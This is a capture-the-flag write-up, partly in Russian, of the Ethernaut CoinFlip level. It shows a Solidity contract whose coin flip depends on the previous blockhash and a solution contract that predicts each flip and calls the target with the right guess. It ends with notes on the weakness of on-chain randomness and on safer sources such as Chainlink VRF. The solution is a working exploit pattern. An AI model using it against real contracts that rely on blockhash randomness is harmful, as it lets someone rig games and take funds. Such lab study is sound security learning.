![](https://ethernaut.openzeppelin.com/imgs/BigLevel3.svg)

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
очевидно, что зная номер блока мы можем предсказывать выпадение монетки. потому надо просто написать код, который будет за нас производить вычисления

solution:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ICoinFlip {
	function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuess {
	uint256 public consecutiveWins = 0;
	uint256 lastHash;
	uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

	function coinFlipGuess(address _coinFlipAddr) external returns (uint256) {	
		uint256 blockValue = uint256(blockhash(block.number - 1));
		if (lastHash == blockValue) {
			revert();
		}	
		lastHash = blockValue;
		uint256 coinFlip = blockValue / FACTOR;
		bool side = coinFlip == 1 ? true : false;
		bool isRight = ICoinFlip(_coinFlipAddr).flip(side);
		
		if (isRight) {
			consecutiveWins++;
		} else {
			consecutiveWins = 0;
		}
		return consecutiveWins;		
	}
}
```

___
Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

Some other options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org)), [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/)).